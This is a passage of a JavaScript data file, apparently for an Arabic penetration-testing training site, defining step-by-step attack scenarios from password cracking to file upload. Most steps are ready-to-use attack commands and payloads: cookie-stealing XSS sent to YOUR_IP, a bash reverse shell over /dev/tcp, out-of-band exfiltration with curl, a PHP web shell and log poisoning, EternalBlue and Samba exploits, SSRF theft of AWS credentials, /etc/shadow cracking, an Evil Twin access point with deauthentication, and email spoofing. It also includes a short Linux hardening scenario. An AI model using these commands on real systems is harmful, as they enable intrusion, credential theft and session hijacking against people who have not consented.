+        { cmd: 'iwconfig wlan0', note: 'التحقق من عودة الكرت للوضع الطبيعي' },
+      ]
+    },
+  ]
+},
+{
+  id: 5,
+  icon: '🔑',
+  title: 'اختبار وكسر كلمات المرور',
+  desc: 'سيناريو كامل: من استخراج الهاشات حتى كسرها بأكثر الطرق فعالية.',
+  difficulty: 'medium',
+  type: 'Passwords',
+  time: '30-90 دقيقة',
+  steps: [
+    {
+      title: 'استخراج الهاشات من نظام Linux',
+      desc: 'كلمات مرور Linux مشفرة في /etc/shadow. تحتاج root للوصول.',
+      commands: [
+        { cmd: 'sudo cat /etc/shadow', note: 'عرض الهاشات (يحتاج root)' },
+        { cmd: 'sudo unshadow /etc/passwd /etc/shadow > combined.txt\ncat combined.txt | head -5', note: 'دمج الملفين لـ john' },
+      ],
+      tip: 'الهاشات الحديثة تبدأ بـ $6$ وهي sha512crypt. القديمة $1$ هي MD5crypt.'
+    },
+    {
+      title: 'تحديد نوع الهاش',
+      desc: 'قبل الكسر، يجب معرفة نوع الهاش لاختيار -m الصحيح في hashcat.',
+      commands: [
+        { cmd: 'echo "5f4dcc3b5aa765d61d8327deb882cf99" | hash-identifier', note: 'تحديد نوع MD5' },
+        { cmd: 'hashid -m "hash_value_here"', note: 'تحديد نوع الهاش مع رقم hashcat' },
+      ],
+      tip: 'جدول الأنواع: MD5=0 | SHA1=100 | SHA256=1400 | NTLM=1000 | bcrypt=3200 | WPA=22000'
+    },
+    {
+      title: 'الكسر بـ hashcat + قاموس + قواعد',
+      desc: 'القواعد تحوّل كلمات القاموس. best64.rule يضاعف فعالية rockyou.',
+      commands: [
+        { cmd: 'hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt', note: 'MD5 بقاموس rockyou الأساسي' },
+        { cmd: 'hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule', note: 'مع قواعد best64' },
+        { cmd: 'hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule -O', note: 'NTLM مع تحسين -O' },
+      ]
+    },
+    {
+      title: 'كسر الملفات المشفرة',
+      desc: 'john يحتوي أدوات لاستخراج هاشات من ملفات مختلفة: ZIP، PDF، Office، SSH.',
+      commands: [
+        { cmd: 'zip2john secret.zip > zip.hash && john zip.hash --wordlist=rockyou.txt', note: 'كسر ZIP مشفر' },
+        { cmd: 'pdf2john doc.pdf > pdf.hash && hashcat -m 10700 pdf.hash rockyou.txt', note: 'كسر PDF (hashcat للـ GPU)' },
+        { cmd: 'ssh2john id_rsa > ssh.hash && john ssh.hash', note: 'كسر مفتاح SSH محمي بـ passphrase' },
+      ]
+    },
+    {
+      title: 'هجوم Brute Force بـ Mask',
+      desc: 'عندما تعرف نمط كلمة المرور، Mask Attack أسرع من قاموس عشوائي.',
+      commands: [
+        { cmd: 'hashcat -m 0 hash.txt -a 3 ?u?l?l?l?l?d?d?d', note: 'حرف كبير + 4 صغيرة + 3 أرقام' },
+        { cmd: 'hashcat -m 0 hash.txt -a 3 "Company?d?d?d?d"', note: 'نمط اسم الشركة + 4 أرقام' },
+      ],
+      tip: '?u=أحرف كبيرة | ?l=صغيرة | ?d=أرقام | ?s=رموز خاصة | ?a=كل شيء'
+    },
+  ]
+},
+// ===== SCENARIOS 6-35 =====
+{
+  id: 6, icon: '🌐', title: 'اختبار XSS كامل خطوة بخطوة',
+  desc: 'سيناريو كامل لاكتشاف وإثبات ثغرات XSS من البداية حتى سرقة الجلسات.',
+  difficulty: 'medium', type: 'Web App', time: '20-45 دقيقة',
+  steps: [
+    { title: 'اكتشاف نقاط الإدخال', desc: 'حدد كل الحقول والبارامترات التي تقبل مدخلات المستخدم.', commands: [{ cmd: 'gobuster dir -u http://target.com -w common.txt\nnmap --script=http-enum target.com', note: 'اكتشاف الـ endpoints أولاً' }], tip: 'كل حقل input, textarea, URL parameter = نقطة اختبار محتملة.' },
+    { title: 'اختبار XSS الأولي', desc: 'أرسل payload بسيط لكشف أي حقل ضعيف.', commands: [{ cmd: '<scr'+'ipt>alert(1)<\/scr'+'ipt>\n"><scr'+'ipt>alert(document.domain)<\/scr'+'ipt>', note: 'أرسل هذا في كل حقل' }] },
+    { title: 'تجاوز الفلاتر', desc: 'إذا حُجب الـ payload، جرب تقنيات التهرب.', commands: [{ cmd: '<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n<details open ontoggle=alert(1)>', note: 'Payloads بديلة بدون script' }] },
+    { title: 'إثبات سرقة الجلسة', desc: 'PoC حقيقي يُثبت خطورة الثغرة.', commands: [{ cmd: 'nc -lvnp 80 # على جهازك\n# Payload:\n<scr'+'ipt>fetch("http://YOUR_IP/?c="+document.cookie)<\/scr'+'ipt>', note: 'استقبال الكوكيز المسروقة' }], tip: 'XSS بدون PoC لسرقة cookies لا يُقنع العميل بخطورة الثغرة.' },
+  ]
+},
+{
+  id: 7, icon: '💉', title: 'SQL Injection يدوياً بالتفصيل',
+  desc: 'منهجية اختبار SQL Injection يدوياً بدون أدوات تلقائية.',
+  difficulty: 'hard', type: 'Web App', time: '45-90 دقيقة',
+  steps: [
+    { title: 'اختبار أولي', desc: 'حرف تنصيص يكسر الـ query إذا كانت الثغرة موجودة.', commands: [{ cmd: "# في URL أو الحقل:\n'\n\"\n1 OR 1=1\n1 AND 1=2", note: 'ابحث عن رسالة خطأ SQL' }] },
+    { title: 'تحديد عدد الأعمدة', desc: 'ORDER BY يساعد في تحديد عدد الأعمدة.', commands: [{ cmd: "1 ORDER BY 1--\n1 ORDER BY 2--\n1 ORDER BY 3-- # خطأ = عدد الأعمدة 2", note: 'كرر حتى تحصل على خطأ' }] },
+    { title: 'UNION SELECT لاستخراج البيانات', desc: 'UNION يدمج نتائج من جداول أخرى.', commands: [{ cmd: "1 UNION SELECT NULL,database(),version()--\n1 UNION SELECT NULL,table_name,NULL FROM information_schema.tables--", note: 'استخراج اسم قاعدة البيانات والجداول' }] },
+    { title: 'استخراج المستخدمين', desc: 'وصلت لجدول المستخدمين؟ استخرج بيانات الاعتماد.', commands: [{ cmd: "1 UNION SELECT NULL,username,password FROM users--", note: 'استخراج المستخدمين والهاشات' }], tip: 'الهاشات المستخرجة قابلة للكسر بـ hashcat.' },
+  ]
+},
+{
+  id: 8, icon: '📁', title: 'Local File Inclusion - LFI كامل',
+  desc: 'سيناريو LFI من الاكتشاف حتى الحصول على RCE عبر Log Poisoning.',
+  difficulty: 'hard', type: 'Web App', time: '30-60 دقيقة',
+  steps: [
+    { title: 'اكتشاف LFI', desc: 'ابحث عن parameters تُحمّل صفحات أو ملفات.', commands: [{ cmd: 'curl "http://target.com/?page=../../../../etc/passwd"\ncurl "http://target.com/?file=/etc/passwd"', note: 'اختبار path traversal' }] },
+    { title: 'قراءة ملفات حساسة', desc: 'استغل LFI لقراءة ملفات الإعداد.', commands: [{ cmd: '# Linux:\n../../../../etc/shadow\n../../../../etc/ssh/sshd_config\n# Web:\n../../../../var/www/html/config.php\n../../../../etc/apache2/apache2.conf', note: 'ملفات مستهدفة بـ LFI' }] },
+    { title: 'Log Poisoning للـ RCE', desc: 'أدخل PHP code في User-Agent ثم اقرأ اللوغ.', commands: [{ cmd: "curl -A '<?php system($_GET[cmd]); ?>' http://target.com\ncurl 'http://target.com/?page=/var/log/apache2/access.log&cmd=id'", note: 'Log Poisoning لتنفيذ أوامر' }], tip: 'يعمل فقط إذا كان Web Server يكتب في log قابل للقراءة.' },
+    { title: 'PHP Filter للكود المصدري', desc: 'اقرأ الكود المصدري بصيغة base64.', commands: [{ cmd: "curl 'http://target.com/?page=php://filter/convert.base64-encode/resource=index'\necho 'BASE64_HERE' | base64 -d", note: 'قراءة الكود المصدري' }] },
+  ]
+},
+{
+  id: 9, icon: '🔐', title: 'اختبار أمان SSH',
+  desc: 'فحص تأمين خدمة SSH: من المسح حتى الاختراق.',
+  difficulty: 'medium', type: 'Network', time: '20-40 دقيقة',
+  steps: [
+    { title: 'فحص SSH بـ Nmap', desc: 'جمع معلومات خدمة SSH.', commands: [{ cmd: 'nmap -sV -p 22 192.168.1.10\nnmap --script=ssh-auth-methods 192.168.1.10\nnmap --script=ssh2-enum-algos 192.168.1.10', note: 'معلومات وإعدادات SSH' }] },
+    { title: 'Brute Force SSH', desc: 'تجربة كلمات المرور الشائعة.', commands: [{ cmd: 'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -t 4\nmedusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh', note: 'هجوم Brute Force على SSH' }], tip: '-t 4 threads فقط لتجنب الحجب.' },
+    { title: 'فحص الـ Keys والإعدادات', desc: 'فحص إعدادات SSH الضعيفة.', commands: [{ cmd: 'ssh -o StrictHostKeyChecking=no user@192.168.1.10\ncat /etc/ssh/sshd_config | grep -E "PasswordAuth|PermitRoot|Port"', note: 'فحص إعدادات SSH' }] },
+    { title: 'استغلال كلمة مرور SSH', desc: 'الاتصال بعد الحصول على credentials.', commands: [{ cmd: 'ssh user@192.168.1.10\nssh -i id_rsa root@192.168.1.10', note: 'الاتصال بـ SSH بكلمة مرور أو مفتاح' }] },
+  ]
+},
+{
+  id: 10, icon: '🏗️', title: 'بناء Lab Metasploitable',
+  desc: 'إعداد بيئة تدريب Metasploitable2 وأول عملية اختراق.',
+  difficulty: 'easy', type: 'Lab Setup', time: '30-60 دقيقة',
+  steps: [
+    { title: 'تنزيل وإعداد Metasploitable2', desc: 'إعداد هدف التدريب.', commands: [{ cmd: '# تنزيل من:\n# https://sourceforge.net/projects/metasploitable/\n# Import في VirtualBox → Host-Only Network', note: 'إعداد Metasploitable' }] },
+    { title: 'اكتشاف الهدف', desc: 'تأكد من الاتصال ومسح المنافذ.', commands: [{ cmd: 'nmap -sn 192.168.56.0/24 # اعثر على IP\nnmap -sV -sC 192.168.56.101', note: 'مسح Metasploitable' }] },
+    { title: 'استغلال vsftpd Backdoor', desc: 'ثغرة backdoor في vsftpd 2.3.4 الشهيرة.', commands: [{ cmd: 'msfconsole -q\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.101\nrun', note: 'Exploit vsftpd backdoor' }], tip: 'تفتح shell على port 6200. ثغرة backdoor متعمدة زُرعت في مصدر vsftpd.' },
+    { title: 'استغلال Samba', desc: 'Samba UserMap Script - ثغرة شهيرة أخرى.', commands: [{ cmd: 'use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.101\nset PAYLOAD cmd/unix/reverse\nset LHOST YOUR_IP\nrun', note: 'Exploit Samba على Metasploitable' }] },
+  ]
+},
+{
+  id: 11, icon: '🔍', title: 'فحص SMB وWindows Enumeration',
+  desc: 'منهجية فحص خدمة SMB واكتشاف الثغرات على Windows.',
+  difficulty: 'medium', type: 'Windows', time: '25-50 دقيقة',
+  steps: [
+    { title: 'فحص SMB بـ Nmap', desc: 'اكتشاف معلومات SMB والثغرات.', commands: [{ cmd: 'nmap --script=smb-enum-shares -p 445 192.168.1.10\nnmap --script=smb-vuln-ms17-010 -p 445 192.168.1.10\nnmap --script=smb2-security-mode 192.168.1.10', note: 'فحص SMB الشامل' }] },
+    { title: 'Enum4Linux', desc: 'أداة متخصصة لـ Enumeration على SMB.', commands: [{ cmd: 'enum4linux -a 192.168.1.10\nenum4linux -u "" -p "" 192.168.1.10', note: 'Enumeration شامل بـ Enum4Linux' }] },
+    { title: 'EternalBlue (MS17-010)', desc: 'إحدى أخطر ثغرات Windows على الإطلاق.', commands: [{ cmd: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.10\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST YOUR_IP\nrun', note: 'استغلال EternalBlue' }], tip: 'EternalBlue تؤثر على Windows 7, 8, 2008, 2012 غير المُحدّثة.' },
+    { title: 'CrackMapExec للـ Lateral Movement', desc: 'استخدام credentials مع CME للتحرك داخل الشبكة.', commands: [{ cmd: 'crackmapexec smb 192.168.1.0/24 -u admin -p password\ncrackmapexec smb 192.168.1.10 -u admin -p pass --shares', note: 'CME للمصادقة وفحص الشبكة' }] },
+  ]
+},
+{
+  id: 12, icon: '⬆️', title: 'Linux Privilege Escalation - SUID',
+  desc: 'سيناريو كامل لرفع الصلاحيات عبر استغلال SUID Binaries.',
+  difficulty: 'hard', type: 'Linux', time: '30-60 دقيقة',
+  steps: [
+    { title: 'فحص SUID', desc: 'البحث عن ملفات SUID قابلة للاستغلال.', commands: [{ cmd: 'find / -perm -4000 2>/dev/null\nfind / -perm -4000 -user root 2>/dev/null | xargs ls -la', note: 'إيجاد SUID Binaries' }] },
+    { title: 'استغلال SUID Binaries', desc: 'GTFOBins يحتوي أوامر لاستغلال كل أداة.', commands: [{ cmd: '# مثال نmap:\nnmap --interactive\nnmap> !sh\n# مثال find:\nfind . -exec /bin/bash -p \\;\n# مثال python:\npython3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"', note: 'استغلال GTFOBins - SUID' }], tip: 'راجع: gtfobins.github.io لكل أداة.' },
+    { title: 'استغلال sudo Misconfiguration', desc: 'sudo -l يكشف الأوامر المسموحة.', commands: [{ cmd: 'sudo -l\n# مثال: (ALL) NOPASSWD: /bin/vim\nsudo vim -c "!bash"', note: 'استغلال sudo privileges' }] },
+    { title: 'LinPEAS للأتمتة', desc: 'البحث التلقائي عن كل نقاط الـ Privesc.', commands: [{ cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh\nchmod +x linpeas.sh && ./linpeas.sh 2>&1 | tee results.txt', note: 'LinPEAS كامل مع حفظ النتائج' }] },
+  ]
+},
+{
+  id: 13, icon: '🕸️', title: 'اختبار SSRF - Server Side Request Forgery',
+  desc: 'اكتشاف واستغلال ثغرات SSRF للوصول للخدمات الداخلية.',
+  difficulty: 'hard', type: 'Web App', time: '30-60 دقيقة',
+  steps: [
+    { title: 'اكتشاف SSRF', desc: 'أي parameter يقبل URL = نقطة اختبار SSRF.', commands: [{ cmd: 'curl "http://target.com/fetch?url=http://127.0.0.1"\ncurl "http://target.com/image?src=http://169.254.169.254/latest/meta-data/"', note: 'اختبار SSRF الأولي' }] },
+    { title: 'SSRF لفحص الشبكة الداخلية', desc: 'استخدم SSRF لاكتشاف الخدمات الداخلية.', commands: [{ cmd: 'for port in 22 80 443 3306 6379 8080; do\ncurl -s "http://target.com/fetch?url=http://192.168.1.1:$port"\ndone', note: 'فحص منافذ الشبكة الداخلية' }] },
+    { title: 'SSRF على AWS Metadata', desc: 'SSRF في EC2 → وصول لـ AWS Credentials.', commands: [{ cmd: 'curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"', note: 'سرقة AWS Credentials عبر SSRF' }], tip: 'IMDSv2 يُخفف هذا الهجوم بالـ Token.' },
+    { title: 'تجاوز فلاتر SSRF', desc: 'تقنيات للتهرب من فلاتر SSRF.', commands: [{ cmd: '# Bypass whitelist:\nhttp://target.com@evil.com\nhttp://evil.com#target.com\n# IP في صيغ مختلفة:\nhttp://2130706433/ # 127.0.0.1 decimal\nhttp://0x7f000001/ # hex', note: 'تقنيات Bypass فلاتر SSRF' }] },
+  ]
+},
+{
+  id: 14, icon: '🧮', title: 'Command Injection وRCE',
+  desc: 'اكتشاف واستغلال ثغرات حقن الأوامر للحصول على تنفيذ كود عن بُعد.',
+  difficulty: 'hard', type: 'Web App', time: '25-50 دقيقة',
+  steps: [
+    { title: 'اكتشاف Command Injection', desc: 'أي تطبيق يُنفّذ أوامر OS ويأخذ مدخلات = خطر.', commands: [{ cmd: '# في حقل input مثل ping:\n127.0.0.1; id\n127.0.0.1 && id\n127.0.0.1 | id\n127.0.0.1 `id`', note: 'فصل الأوامر لحقن الأوامر' }] },
+    { title: 'استخراج معلومات النظام', desc: 'بعد تأكيد الثغرة، اجمع المعلومات.', commands: [{ cmd: '127.0.0.1; whoami; id; uname -a; cat /etc/passwd', note: 'استخراج معلومات النظام' }] },
+    { title: 'الحصول على Reverse Shell', desc: 'تحويل Command Injection إلى shell تفاعلي.', commands: [{ cmd: '# على جهازك:\nnc -lvnp 4444\n# الـ Payload:\n127.0.0.1; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1', note: 'Reverse Shell من Command Injection' }] },
+    { title: 'Blind Command Injection', desc: 'لا ترى النتيجة مباشرة → استخدم out-of-band.', commands: [{ cmd: '# على جهازك: تشغيل DNS server\n# الـ Payload:\n127.0.0.1; nslookup `id`.YOUR_DOMAIN\n# أو:\n127.0.0.1; curl http://YOUR_IP/$(whoami)', note: 'Blind Command Injection عبر DNS/HTTP' }] },
+  ]
+},
+{
+  id: 15, icon: '🔑', title: 'اختبار Active Directory - المبتدئ',
+  desc: 'مدخل لاختبار Active Directory: Enumeration والهجمات الأساسية.',
+  difficulty: 'hard', type: 'Active Directory', time: '60-120 دقيقة',
+  steps: [
+    { title: 'Enumeration أولي لـ AD', desc: 'اكتشاف Domain Controller والمستخدمين.', commands: [{ cmd: 'nmap -sV -p 88,389,636,3268 192.168.1.0/24\nldapsearch -x -H ldap://DC_IP -b "dc=corp,dc=local" -D "user@corp.local" -w password', note: 'اكتشاف AD عبر LDAP' }] },
+    { title: 'BloodHound لتحليل AD', desc: 'BloodHound يُظهر مسارات الهجوم بصرياً.', commands: [{ cmd: "bloodhound-python -u user -p pass -ns DC_IP -d corp.local -c All\nneo4j console &\nbloudhound & # ثم import JSON files", note: 'جمع بيانات AD بـ BloodHound' }] },
+    { title: 'AS-REP Roasting', desc: 'حسابات بدون Kerberos Pre-auth = قابلة للهجوم.', commands: [{ cmd: 'impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -outputfile asrep_hashes.txt\nhashcat -m 18200 asrep_hashes.txt rockyou.txt', note: 'AS-REP Roasting وكسر الهاشات' }] },
+    { title: 'Kerberoasting', desc: 'طلب TGS لحسابات الخدمات ثم كسرها offline.', commands: [{ cmd: 'impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -outputfile kerb.txt\nhashcat -m 13100 kerb.txt rockyou.txt', note: 'Kerberoasting وكسر الهاشات' }], tip: 'حسابات الخدمة كثيراً ما تملك كلمات مرور ضعيفة.' },
+  ]
+},
+{
+  id: 16, icon: '📡', title: 'Evil Twin WiFi Attack',
+  desc: 'إنشاء نقطة وصول وهمية لاعتراض بيانات الاعتماد.',
+  difficulty: 'hard', type: 'Wireless', time: '30-60 دقيقة',
+  steps: [
+    { title: 'إعداد الواجهة اللاسلكية', desc: 'تفعيل Monitor Mode وإيقاف العمليات المتعارضة.', commands: [{ cmd: 'sudo airmon-ng check kill\nsudo airmon-ng start wlan0', note: 'تفعيل Monitor Mode' }] },
+    { title: 'مسح الشبكات وتحديد الهدف', desc: 'رصد الشبكات المحيطة وتحديد الهدف.', commands: [{ cmd: 'sudo airodump-ng wlan0mon\n# سجّل: BSSID, Channel, ESSID للهدف', note: 'مسح شبكات WiFi' }] },
+    { title: 'إنشاء Evil Twin AP', desc: 'نقطة وصول وهمية بنفس اسم الشبكة.', commands: [{ cmd: 'sudo airbase-ng -e "TargetWiFi" -c 6 wlan0mon\n# في ترمينال آخر:\nsudo ifconfig at0 up 10.0.0.1/24\necho "interface=at0\ndhcp-range=10.0.0.2,10.0.0.20\naddress=/#/10.0.0.1" > evil_dns.conf\nsudo dnsmasq -C evil_dns.conf', note: 'إنشاء AP وهمي مع DHCP' }] },
+    { title: 'Deauthentication لإجبار العملاء', desc: 'طرد العملاء من الشبكة الأصلية.', commands: [{ cmd: 'sudo aireplay-ng --deauth 0 -a BSSID wlan0mon', note: 'إرسال deauth مستمر' }], tip: 'العميل سيتصل بالـ AP الأقوى إشارةً. قرّب الجهاز من الضحية.' },
+  ]
+},
+{
+  id: 17, icon: '🦑', title: 'اختبار أمان تطبيقات Android',
+  desc: 'فحص تطبيقات Android: Decompile, API Analysis, Traffic Intercept.',
+  difficulty: 'hard', type: 'Mobile', time: '60-120 دقيقة',
+  steps: [
+    { title: 'Decompile تطبيق APK', desc: 'تحليل كود التطبيق بعد التفكيك.', commands: [{ cmd: 'apktool d app.apk -o app_decoded\n# أو للكود:\njadx -d app_java app.apk\ngrep -r "password\\|api_key\\|secret" app_decoded/', note: 'تفكيك وتحليل APK' }] },
+    { title: 'MobSF للتحليل التلقائي', desc: 'MobSF يحلل APK تلقائياً ويكشف الثغرات.', commands: [{ cmd: 'docker pull opensecurity/mobile-security-framework-mobsf\ndocker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf\n# ثم: http://localhost:8000', note: 'تشغيل MobSF' }] },
+    { title: 'اعتراض Traffic بـ Burp', desc: 'ضبط Proxy على الجهاز لاعتراض طلبات API.', commands: [{ cmd: '# على جهاز Android:\n# Settings → WiFi → Proxy → Manual\n# IP: Burp IP, Port: 8080\n# تثبيت Certificate من: http://burp', note: 'إعداد Burp مع Android' }] },
+    { title: 'ADB لفحص البيانات المحلية', desc: 'ADB يتيح الوصول للبيانات المخزنة محلياً.', commands: [{ cmd: 'adb devices\nadb shell\nls /data/data/com.target.app/databases/\nadb shell cat /data/data/com.target.app/shared_prefs/prefs.xml', note: 'فحص بيانات التطبيق المحلية' }], tip: 'كلمات المرور في Shared Preferences بشكل plaintext = ثغرة خطيرة.' },
+  ]
+},
+{
+  id: 18, icon: '🔒', title: 'اختبار HTTPS وTLS Security',
+  desc: 'فحص شهادات SSL/TLS وإعداداتها وثغراتها.',
+  difficulty: 'medium', type: 'Network', time: '20-40 دقيقة',
+  steps: [
+    { title: 'فحص TLS بـ testssl.sh', desc: 'testssl.sh يفحص كل جوانب TLS تلقائياً.', commands: [{ cmd: 'apt install testssl.sh\ntestssl.sh https://target.com\ntestssl.sh --severity HIGH --full https://target.com', note: 'فحص TLS الشامل' }] },
+    { title: 'SSLScan', desc: 'اكتشاف Protocols وCipher Suites الضعيفة.', commands: [{ cmd: 'sslscan target.com\nsslscan --tls10 --tls11 target.com', note: 'فحص SSL/TLS Protocols والـ Ciphers' }], tip: 'SSLv2, SSLv3, TLS 1.0 و1.1 = deprecated. RC4 وDES = ضعيف.' },
+    { title: 'فحص Heartbleed', desc: 'Heartbleed (CVE-2014-0160) ثغرة OpenSSL الشهيرة.', commands: [{ cmd: 'nmap --script=ssl-heartbleed -p 443 target.com\nsslyze --heartbleed target.com', note: 'فحص ثغرة Heartbleed' }] },
+    { title: 'CRIME وBEAST وPOODLE', desc: 'ثغرات في ضغط وتشفير TLS.', commands: [{ cmd: 'testssl.sh --crime --beast --poodle https://target.com', note: 'فحص ثغرات TLS المعروفة' }] },
+  ]
+},
+{
+  id: 19, icon: '📧', title: 'هجمات الهندسة الاجتماعية - Phishing',
+  desc: 'محاكاة هجمات التصيد الاحتيالي باستخدام GoPhish وSET.',
+  difficulty: 'medium', type: 'Social Engineering', time: '40-80 دقيقة',
+  steps: [
+    { title: 'GoPhish - منصة Phishing', desc: 'GoPhish للمحاكاة الاحترافية لحملات Phishing.', commands: [{ cmd: 'wget https://github.com/gophish/gophish/releases/latest/download/gophish-linux-64bit.zip\nunzip gophish-linux-64bit.zip\nchmod +x gophish && ./gophish\n# افتح: https://localhost:3333', note: 'إعداد GoPhish' }] },
+    { title: 'SET - Social Engineering Toolkit', desc: 'SET مثبت في Kali. يوفر قوالب هجمات جاهزة.', commands: [{ cmd: 'setoolkit\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester\n# 2) Site Cloner → أدخل URL', note: 'استنساخ موقع لجمع الـ credentials' }] },
+    { title: 'Email Spoofing', desc: 'محاكاة إرسال بريد بعنوان مزيف.', commands: [{ cmd: 'swaks --to victim@company.com --from ceo@company.com --server mail.company.com --body "Click: http://attacker.com"', note: 'اختبار Email Spoofing' }], tip: 'فحص SPF/DKIM/DMARC: اكتشاف غيابها يعني إمكانية Spoofing.' },
+    { title: 'تحليل نتائج الحملة', desc: 'من فتح الإيميل؟ من ضغط الرابط؟ من أدخل credentials؟', commands: [{ cmd: '# GoPhish Dashboard:\n# Campaigns → View Results\n# إحصائيات: Sent, Opened, Clicked, Submitted', note: 'تحليل إحصائيات الحملة' }] },
+  ]
+},
+{
+  id: 20, icon: '🌐', title: 'اختبار DNS Security',
+  desc: 'فحص إعدادات DNS وهجمات DNS Enumeration وZone Transfer.',
+  difficulty: 'medium', type: 'Network', time: '20-40 دقيقة',
+  steps: [
+    { title: 'DNS Enumeration', desc: 'جمع معلومات DNS للنطاق المستهدف.', commands: [{ cmd: 'nslookup target.com\ndig target.com ANY\ndig +short MX target.com\ndig +short TXT target.com', note: 'جمع سجلات DNS' }] },
+    { title: 'Zone Transfer', desc: 'Zone Transfer غير محمي يكشف كل النطاقات الفرعية.', commands: [{ cmd: 'dig axfr @ns1.target.com target.com\nhost -t axfr target.com ns1.target.com\nfiercedomains --domain target.com', note: 'محاولة Zone Transfer' }], tip: 'Zone Transfer المسموح يكشف خريطة كاملة للبنية التحتية.' },
+    { title: 'Subfinder لاكتشاف Subdomains', desc: 'أفضل أداة لاكتشاف النطاقات الفرعية.', commands: [{ cmd: 'apt install subfinder\nsubfinder -d target.com\nsubfinder -d target.com -o subdomains.txt', note: 'اكتشاف Subdomains' }] },
+    { title: 'DNS Cache Poisoning Test', desc: 'فحص قابلية التأثر بـ DNS Cache Poisoning.', commands: [{ cmd: 'nmap --script=dns-cache-snoop --script-args dns-cache-snoop.mode=nonrecursive,dns-cache-snoop.domains={google.com} -p53 DNS_SERVER', note: 'اختبار DNS Cache Poisoning' }] },
+  ]
+},
+{
+  id: 21, icon: '🛡️', title: 'تصلية نظام Linux (Hardening)',
+  desc: 'خطوات تقوية أمان نظام Linux بعد التثبيت.',
+  difficulty: 'medium', type: 'Blue Team', time: '30-60 دقيقة',
+  steps: [
+    { title: 'تحديث وتأمين SSH', desc: 'تقوية إعدادات SSH.', commands: [{ cmd: 'sed -i "s/#PermitRootLogin.*/PermitRootLogin no/" /etc/ssh/sshd_config\nsed -i "s/#PasswordAuthentication.*/PasswordAuthentication no/" /etc/ssh/sshd_config\necho "AllowUsers your_user" >> /etc/ssh/sshd_config\nsystemctl restart sshd', note: 'تقوية إعدادات SSH' }], tip: 'استخدم SSH Keys فقط، عطّل كلمات المرور.' },
+    { title: 'ضبط Firewall بـ UFW', desc: 'تفعيل Firewall وفتح المنافذ الضرورية فقط.', commands: [{ cmd: 'apt install ufw && ufw default deny incoming\nufw default allow outgoing\nufw allow 22/tcp comment "SSH"\nufw enable && ufw status verbose', note: 'إعداد UFW Firewall' }] },
+    { title: 'فحص خدمات غير ضرورية', desc: 'أوقف وأزل الخدمات غير الضرورية.', commands: [{ cmd: 'systemctl list-units --type=service --state=running\nsystemctl disable telnet 2>/dev/null\napt remove --purge telnetd rsh-server', note: 'إيقاف الخدمات غير الضرورية' }] },
+    { title: 'تفعيل Fail2Ban', desc: 'Fail2Ban يحجب IPs التي تحاول Brute Force.', commands: [{ cmd: 'apt install fail2ban\ncp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local\n# تعديل jail.local:\n# bantime = 3600\n# maxretry = 3\nsystemctl enable --now fail2ban', note: 'إعداد Fail2Ban ضد Brute Force' }] },
+  ]
+},
+{
+  id: 22, icon: '🔧', title: 'اختبار أمان API REST',
+  desc: 'منهجية شاملة لاختبار أمان REST APIs.',
+  difficulty: 'hard', type: 'Web App', time: '40-80 دقيقة',
+  steps: [
+    { title: 'اكتشاف API Documentation', desc: 'البحث عن Swagger/OpenAPI Documentation.', commands: [{ cmd: 'ffuf -w common.txt -u http://target.com/FUZZ -mc 200 | grep -i "swagger\\|api\\|docs"\ncurl http://target.com/swagger.json 2>/dev/null\ncurl http://target.com/api/docs/', note: 'اكتشاف API Documentation' }] },
+    { title: 'اختبار Authentication', desc: 'فحص آليات المصادقة.', commands: [{ cmd: '# اختبار بدون Token:\ncurl http://api.target.com/users\n# Broken Authentication:\ncurl -H "Authorization: Bearer EXPIRED_TOKEN" http://api.target.com/profile\ncurl -H "Authorization: Bearer " http://api.target.com/admin', note: 'اختبار Authentication API' }] },
+    { title: 'IDOR وBOLA', desc: 'أخطر ثغرة API: الوصول لموارد مستخدمين آخرين.', commands: [{ cmd: '# طلب طبيعي:\ncurl -H "Auth: Token" http://api.target.com/user/1234\n# هجوم IDOR:\ncurl -H "Auth: Token" http://api.target.com/user/1235\ncurl -H "Auth: Token" http://api.target.com/admin/users', note: 'اختبار IDOR/BOLA' }] },
+    { title: 'Rate Limiting وDOS', desc: 'فحص قيود معدل الطلبات.', commands: [{ cmd: "seq 100 | xargs -P 10 -I {} curl -s -o /dev/null -w '%{http_code}' http://api.target.com/login -d 'user=admin&pass=test'\nab -n 1000 -c 50 http://api.target.com/", note: 'اختبار Rate Limiting' }] },
+  ]
+},
+{
+  id: 23, icon: '🗂️', title: 'Directory Traversal وFile Upload',
+  desc: 'اكتشاف واستغلال ثغرات Directory Traversal وFile Upload غير الآمن.',
+  difficulty: 'medium', type: 'Web App', time: '25-50 دقيقة',
+  steps: [
+    { title: 'Directory Traversal', desc: 'الخروج من المجلد المسموح للوصول لملفات النظام.', commands: [{ cmd: 'curl "http://target.com/download?file=../../../../etc/passwd"\ncurl "http://target.com/view?path=..%2F..%2Fetc%2Fpasswd"', note: 'اختبار Path Traversal' }] },
+    { title: 'File Upload - اكتشاف الثغرة', desc: 'رفع ملفات تنفيذية على الخادم.', commands: [{ cmd: '# أنشئ shell بسيط:\necho "<?php system(\\$_GET[cmd]); ?>" > shell.php\n# حاول رفعه مباشرة\n# إذا رُفض: غيّر الامتداد\ncp shell.php shell.php5\ncp shell.php shell.phtml', note: 'رفع PHP Shell' }] },
